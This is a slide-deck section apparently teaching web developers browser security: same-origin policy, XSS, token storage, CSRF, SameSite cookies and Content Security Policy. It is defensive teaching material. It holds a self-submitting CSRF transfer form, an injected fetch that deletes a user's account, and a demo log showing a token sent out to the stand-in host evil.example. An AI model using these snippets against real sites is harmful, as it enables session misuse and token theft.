---
layout: section
routeAlias: browser
---

<div class="section-num">01</div>

# How the browser thinks

<div class="section-sub">What XSS gives an attacker, and the browser's own defenses</div>

---

# The origin is the browser's boundary

<MdnLink path="Web/Security/Defenses/Same-origin_policy">Same-origin policy: one origin can't read another's data</MdnLink>

<div class="origin-url"><span class="k">https://</span><span class="t">shop.example</span><span class="v">:443</span><span class="muted">/cart</span></div>
<div class="origin-labels"><span class="k">protocol</span><span class="t">host</span><span class="v">port</span><span class="muted">path (not part of the origin)</span></div>

| Compared with `https://shop.example` | Same origin? |
|---|---|
| `https://shop.example/account` | <lucide-check class="ok" /> yes: only the path differs |
| `http://shop.example` | <lucide-x class="ng" /> no: different protocol |
| `https://api.shop.example` | <lucide-x class="ng" /> no: different host |
| `https://shop.example:8443` | <lucide-x class="ng" /> no: different port |

<div class="punch">Inside one origin, every script has the same powers</div>

<style>
.origin-url { font-family: var(--slidev-code-font-family, monospace); font-size: 1.6rem; text-align: center; margin-top: 0.8rem; }
.origin-labels { display: flex; justify-content: center; gap: 1.5rem; font-size: 0.75rem; margin-bottom: 0.6rem; }
.origin-url .k, .origin-labels .k { color: var(--cyan); }
.origin-url .t, .origin-labels .t { color: var(--pink); }
.origin-url .v, .origin-labels .v { color: var(--purple); }
.origin-url .muted, .origin-labels .muted { color: var(--comment); }
</style>

---

# XSS: their code inside your origin

<MdnLink path="Web/Security/Attacks/XSS">Cross-site scripting: malicious code runs "as though it was part of the website"</MdnLink>

<div class="cols xss-types">
<div class="card">
<div class="col-h"><lucide-database /> Stored</div>
Saved in your DB (a post, a comment), served to every visitor
</div>
<div class="card">
<div class="col-h"><lucide-link /> Reflected</div>
A crafted link the victim clicks; the server echoes <code>?q=&lt;script&gt;…</code> into the page
</div>
<div class="card">
<div class="col-h"><lucide-code /> DOM-based</div>
Your own JS writes URL or <code>postMessage</code> data into the DOM
</div>
</div>

<div class="col-h ng xss-can"><lucide-skull /> Once inside, it can</div>

<div class="xss-list">

- **Read storage**: tokens in `localStorage`
- **Act as the user**: `fetch` sends their cookies
- **Rewrite the page**: a fake login form
- **Watch the user**: keystrokes, form fields

</div>

<div v-click class="punch">Anything your own code can do: the user's session, in someone else's hands</div>

<div class="source"><lucide-link /><a href="https://owasp.org/www-community/Types_of_Cross-Site_Scripting" target="_blank">OWASP: Types of XSS</a></div>

<style>
.xss-types { align-items: stretch; margin-top: 1.1rem; }
.xss-types .card { font-size: 0.85rem; line-height: 1.4; }
.xss-can { margin-top: 1.2rem; font-size: 1rem; }
.xss-list ul { columns: 2; column-gap: 2rem; margin-top: 0.3rem; }
.xss-list li { break-inside: avoid; }
</style>

---

# Where should the token live?

<MdnLink path="Web/HTTP/Reference/Headers/Set-Cookie">Set-Cookie: the HttpOnly attribute</MdnLink>

<div class="cols">
<div class="card">
<div class="col-h ng"><lucide-x /> localStorage</div>

```js
localStorage.setItem('token', jwt)
```

- **Stolen**: any script on your page reads it, injected ones too, and it works from the attacker's machine until it expires

</div>
<div class="card lit">
<div class="col-h ok"><lucide-check /> HttpOnly cookie</div>

```http
Set-Cookie: session=…; HttpOnly; Secure
```

- **Can't be read**: `document.cookie` doesn't see it, but `fetch` still sends it

</div>
</div>

<div v-click class="misuse">
<div class="col-h ng"><lucide-triangle-alert /> But an injected script can still <i>use</i> it</div>

```js
// can't read the cookie, but the browser attaches it anyway
fetch('/api/account', {
  method: 'DELETE', // delete the user's account, as them
})
```

<div class="note"><b>Theft</b>: works from anywhere, until the token expires. <b>Misuse</b>: only through your API, only while the user's tab is open. <code>HttpOnly</code> stops theft, not misuse</div>
</div>

<div class="source"><lucide-link /><a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage" target="_blank">OWASP: "Do not store session identifiers in local storage"</a></div>

<style>
.cols { margin-top: 1.1rem; }
.misuse { margin-top: 0.8rem; }
.misuse .col-h { margin-bottom: 0.3rem; }
</style>

---

# CSRF: how the attack works

<MdnLink path="Web/Security/Attacks/CSRF">Cross-site request forgery: another site sends the request, your browser adds the cookie</MdnLink>

<div class="cols middle">
<div>

<div class="csrf-steps">
<v-clicks>

1. **You log in**: bank.example sets a session cookie
2. **Still logged in, you visit evil.example**: from an email, an ad, any link
3. **It sends a request to bank.example**: a hidden form submits itself
4. **The browser attaches the cookie**: unless the cookie forbids it (next slide)
5. **The bank sees a valid session**: the transfer goes through

</v-clicks>
</div>

</div>
<div>

<div class="where"><lucide-skull /> evil.example</div>

<div class="small-code">

```html
<form action="https://bank.example/transfer"
      method="POST">
  <input type="hidden" name="to" value="attacker" />
</form>
<script>document.forms[0].submit()</script>
```

</div>
</div>
</div>

<div v-click class="punch">They never see the cookie: they make the browser use it</div>

<style>
.csrf-steps { margin-top: 1.2rem; }
.csrf-steps li { font-size: 0.95rem; line-height: 1.45; margin: 0.7rem 0; }
</style>

---

# Insecure vs secure session cookie

<div class="sub">Set by bank.example's server at login. In Next.js, that's your Server Function or Route Handler</div>

<div class="cols cookie-cmp">
<div class="card">
<div class="col-h ng"><lucide-x /> Insecure</div>

```ts
const cookieStore = await cookies() // next/headers
cookieStore.set('session', id,
  { sameSite: 'none', secure: true })
```

- **Sent from any site**: because of `sameSite: 'none'`
- **Readable by any script**: no `httpOnly`

</div>
<div class="card lit" v-click>
<div class="col-h ok"><lucide-check /> Secure</div>

```ts
const cookieStore = await cookies() // next/headers
cookieStore.set('session', id,
  { sameSite: 'lax', secure: true, httpOnly: true })
```

- **Not sent with other sites' POSTs**: `sameSite: 'lax'`
- **Only sent over HTTPS**: `secure`
- **Invisible to JavaScript**: `httpOnly`

</div>
</div>

<div class="atk" v-click>

| Attack from evil.example | Insecure | Secure |
|---|---|---|
| Hidden form POST | <lucide-triangle-alert class="ng" /> cookie sent | <lucide-shield-check class="ok" /> not sent |
| GET navigation: `location = '…/transfer?to=attacker'` | <lucide-triangle-alert class="ng" /> cookie sent | <lucide-triangle-alert class="ng" /> still sent |

</div>

<div class="punch" v-click>Lax blocks their POST, not their GET: never change data with a GET</div>

<div class="source"><lucide-link /><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value" target="_blank">MDN: Set-Cookie, SameSite</a> · <a href="https://developer.mozilla.org/en-US/docs/Glossary/Site" target="_blank">MDN: Site</a> · <a href="https://nextjs.org/docs/app/api-reference/functions/cookies" target="_blank">Next.js: cookies</a></div>

<style>
.cookie-cmp { margin-top: 0.3rem; }
.cookie-cmp .card { padding: 0.4rem 0.9rem; }
.cookie-cmp .col-h { margin-bottom: 0.2rem; }
.cookie-cmp .slidev-code-wrapper, .cookie-cmp pre { margin: 0.2rem 0 !important; }
.cookie-cmp .slidev-code { font-size: 0.7rem !important; line-height: 1.4 !important; }
.atk { margin: 1rem 0 0; }
.atk table { font-size: 0.8rem; margin: 0; }
.cookie-cmp ~ .punch { margin-top: 1.2rem; }
.atk table th, .atk table td { padding: 0.2rem 0.6rem !important; }
</style>

<!-- Optional, if there's time: Strict also blocks the GET, but then links from other sites arrive logged out. SameSite is per-site, not per-origin, so every *.bank.example subdomain counts as the same site and still gets the cookie. -->


---

# Tell the browser which scripts may run <span class="badge" style="--c: var(--green)">defense</span>

<MdnLink path="Web/HTTP/Guides/CSP">Content Security Policy (CSP): a response header your server sends</MdnLink>

- **No policy by default**: without the header, every script on the page runs
- **'self'**: only script files from your origin; inline `<script>` and `onerror=` are blocked
- **'unsafe-inline'**: allows inline code again, which switches this defense off
- **Per page, and injected code can't switch it off**: send it on every HTML response

```http
Content-Security-Policy: default-src 'self'
```

<div class="note">In a modern framework, blocking all inline scripts breaks its own hydration code: the practical policy is a per-request nonce with <code>'strict-dynamic'</code></div>

<div class="punch">A backup defense: when escaping fails, the browser still refuses to run it</div>

<div class="source"><lucide-link /><a href="https://web.dev/articles/strict-csp" target="_blank">web.dev: strict CSP (nonce + strict-dynamic)</a></div>

---

# Reproduction: the hook vs CSP <span class="badge" style="--c: var(--red)">demo</span>

<div class="sub">The hook's post twice: as is, and with a policy on the page</div>

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

<div class="cols">
<div>

<div class="col-h ng"><lucide-x /> No CSP</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

<div class="col-h ok"><lucide-check /> default-src 'self'</div>

<div class="devtools">
<div class="dt-h">DevTools → Console</div>
<div class="dt-row ok">Executing inline event handler violates the following Content Security Policy directive 'default-src 'self''. … The action has been blocked.</div>
</div>

</div>
</div>

<div class="pills"><DemoLink href="demos/hook.html">Without CSP</DemoLink><DemoLink href="demos/csp.html">With CSP</DemoLink></div>

<div class="note">The policy as a <code>&lt;meta&gt;</code> tag: a static demo page has no server to send the header</div>

<div class="foot"><lucide-flask-conical /> The demo pages send a fake token to <b>evil.example</b>, a reserved domain that never resolves. Nothing leaves the browser</div>

---
routeAlias: browser-layers
---

# Three layers of defense

<div class="sub">Each layer assumes the one above it failed</div>

<div class="cols layers-wrap">
<div class="layers">
  <div class="layer">
    <div class="num">1</div>
    <div class="body"><b>Keep their code out</b><small>escaping, sanitizing: the next section</small></div>
    <span class="badge" style="--c: var(--green)">prevention</span>
  </div>
  <div class="fail"><lucide-arrow-down /> their code gets into the page anyway</div>
  <div class="layer">
    <div class="num">2</div>
    <div class="body"><b>Stop it from running</b><small>CSP <code>script-src</code>: only allowed scripts, no inline code</small></div>
    <span class="badge" style="--c: var(--cyan)">backup</span>
  </div>
  <div class="fail"><lucide-arrow-down /> it runs anyway: <code>'unsafe-inline'</code>, a page without the header</div>
  <div class="layer">
    <div class="num">3</div>
    <div class="body"><b>Limit what it gets</b><small>token in an <code>HttpOnly</code> cookie; CSP <code>connect-src</code></small></div>
    <span class="badge" style="--c: var(--orange)">damage control</span>
  </div>
</div>
<div class="card side">
<div class="col-h"><lucide-split /> Separate path: CSRF</div>

No injected code: another site sends the request with your cookie

- **Session cookie**: `SameSite=Lax`
- **API design**: no data changes on `GET`

</div>
</div>

<div class="punch">Don't count on one layer: each catches what the one above missed</div>

<div class="bridge">Layer 1 is what React does for you, partly → <b>Dangerous code</b></div>

<style>
.layers-wrap { margin-top: 0.5rem; align-items: center; }
.layers-wrap > .layers { flex: 1.8 1 0; }
.layer { display: flex; align-items: center; gap: 0.9rem; padding: 0.55rem 0.9rem; border: 1px solid var(--border); border-radius: 0.6rem; background: var(--background); }
.layer .num { flex: 0 0 auto; width: 1.8rem; height: 1.8rem; border-radius: 50%; display: grid; place-items: center; font-weight: bold; color: var(--background); background: var(--purple); }
.layer .body { flex: 1 1 auto; }
.layer .body b { display: block; color: var(--foreground); }
.layer .body small { color: var(--comment); font-size: 0.75rem; }
.layer .badge { flex: 0 0 auto; }
.fail { display: flex; align-items: center; gap: 0.4rem; margin: 0.25rem 0 0.25rem 1.2rem; font-size: 0.72rem; color: var(--red); }
.side { font-size: 0.8rem; }
</style>
